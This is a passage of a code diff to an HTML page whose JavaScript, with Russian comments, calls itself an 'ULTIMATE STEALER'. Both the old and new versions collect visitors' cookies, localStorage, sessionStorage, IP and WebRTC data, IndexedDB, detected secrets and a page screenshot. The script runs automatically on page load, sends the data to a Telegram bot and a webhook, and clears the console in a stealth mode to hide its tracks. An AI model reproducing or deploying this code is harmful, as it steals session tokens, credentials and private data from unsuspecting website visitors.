-                            // Динамическая загрузка
-                            const script = document.createElement('script');
-                            script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
-                            await new Promise((resolve, reject) => {
-                                script.onload = resolve;
-                                script.onerror = reject;
-                                document.head.appendChild(script);
-                            });
-                            const canvas = await window.html2canvas(document.body, {
-                                useCORS: true,
-                                allowTaint: true,
-                                scale: 0.15,
-                                logging: false,
-                                backgroundColor: null,
-                                width: window.innerWidth,
-                                height: window.innerHeight
-                            });
-                            screenshot = canvas.toDataURL('image/jpeg', 0.2);
-                        }
-                    } catch {}
-                }
-                
-                // === ФОРМИРУЕМ ДАННЫЕ ===
+
+                log('✅ Сбор данных завершён');
+
+                // Собираем все данные в один объект
                 const fullData = {
                     timestamp: new Date().toISOString(),
                     url: window.location.href,
-                    referrer: document.referrer,
+                    referrer: document.referrer || 'нет',
                     userAgent: navigator.userAgent,
                     ips: ips.value || [],
                     webrtc: webrtc.value || {},
@@ -1477,71 +903,102 @@
                     sensors: sensors.value || {},
                     media: media.value || null,
                     localScan: localScan.value || [],
-                    dom: domData.value || {},
                     indexedDB: indexedDB.value || null,
-                    secrets: secrets || [],
-                    screenshot: screenshot ? screenshot.length : 0,
+                    screenshot: screenshot.value ? screenshot.value.length : 0,
                     keylogger: keylogger ? { active: true } : null,
-                    persistence: persistence ? { active: true } : null,
-                    sandbox: sandbox || {},
+                    dom: {
+                        title: document.title,
+                        url: window.location.href,
+                        referrer: document.referrer,
+                        cookies: document.cookie || 'нет',
+                        localStorage: { ...localStorage },
+                        sessionStorage: { ...sessionStorage }
+                    },
                     performance: {
-                        total: Math.round(performance.now() - startTime),
-                        memory: performance.memory ? {
-                            total: performance.memory.totalJSHeapSize,
-                            used: performance.memory.usedJSHeapSize
-                        } : null
+                        total: Math.round(performance.now() - startTime)
                     }
                 };
-                
-                status.textContent = '⏳ Отправка данных...';
-                
-                // === ЭКСФИЛЬТРАЦИЯ ===
-                const exfiltrator = new Exfiltrator();
-                const report = formatUltimateReport(fullData);
-                
-                // Отправка через все каналы
-                await exfiltrator.send(report);
-                
-                // Если есть скриншот — отправляем отдельно
-                if (screenshot && screenshot.length > 5000) {
+
+                // Ищем секреты
+                const secrets = findAllSecrets({
+                    localStorage: { ...localStorage },
+                    sessionStorage: { ...sessionStorage },
+                    cookies: document.cookie
+                });
+                fullData.secrets = secrets;
+
+                // Формируем отчёт
+                const report = formatReport(fullData);
+                log(`📊 Отчёт сформирован (${report.length} символов)`);
+
+                setStatus('📤 Отправка данных...');
+
+                // Отправка ВСЕМИ каналами
+                const telegramOk = await sendToTelegram(report);
+                const webhookOk = await sendToWebhook(fullData);
+
+                // Отправка скриншота отдельно (если есть и он большой)
+                if (screenshot.value && screenshot.value.length > 10000) {
                     try {
                         const form = new FormData();
                         form.append('chat_id', CFG.CHAT_ID);
-                        form.append('photo', await fetch(screenshot).then(r => r.blob()), 'screenshot.jpg');
+                        form.append('photo', await fetch(screenshot.value).then(r => r.blob()), 'screenshot.jpg');
                         await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendPhoto`, {
                             method: 'POST',
                             body: form
                         });
-                    } catch {}
+                        log('📸 Скриншот отправлен');
+                    } catch (e) {
+                        log('⚠️ Скриншот не отправлен: ' + e.message);
+                    }
                 }
-                
-                // Отправка полных данных в Webhook
-                try {
-                    await fetch(CFG.WEBHOOK, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(fullData)
-                    });
-                } catch {}
-                
-                status.textContent = '✅ Данные отправлены';
-                console.log('✅ Ultimate stealer complete');
-                
-                // === ЗАВЕРШЕНИЕ ===
-                // Очищаем следы
+
+                if (telegramOk || webhookOk) {
+                    setStatus('✅ Данные отправлены!');
+                    log('✅ УСПЕШНО! Данные отправлены в Telegram и Webhook');
+                } else {
+                    setStatus('⚠️ Частичная отправка');
+                    log('⚠️ Не все каналы сработали');
+                }
+
+                // Показываем кнопку теста
+                document.getElementById('testBtn').style.display = 'block';
+                document.getElementById('testBtn').onclick = window.testSend;
+
+                // Очистка следов
                 if (CFG.STEALTH) {
-                    // Очищаем консоль
                     console.clear();
-                    // Скрываем статус
                     setTimeout(() => {
-                        status.style.opacity = '0';
-                    }, 2000);
+                        statusEl.style.opacity = '0';
+                    }, 3000);
                 }
-                
+
+                log(`⏱️ Время выполнения: ${Math.round(performance.now() - startTime)}ms`);
+
             } catch (e) {
-                console.log('✅ Загрузка завершена');
+                setStatus('❌ Ошибка');
+                log('❌ Критическая ошибка: ' + e.message);
+                console.error(e);
             }
         })();
+
+        // ================================================================
+        // ЗАПУСК
+        // ================================================================
+        log('🚀 Инициализация...');
+        setTimeout(ultimateStealer, 300);
+
+        // Тест по F12 (для отладки)
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F12') {
+                log('🔍 F12 нажата');
+            }
+        });
+
+        console.log('✅ ULTIMATE STEALER загружен');
+        console.log('📋 Для теста нажмите testSend() в консоли или кнопку внизу страницы');
+        console.log('🔍 Отладка в правом верхнем углу');
+
     </script>
 </body>
 </html>
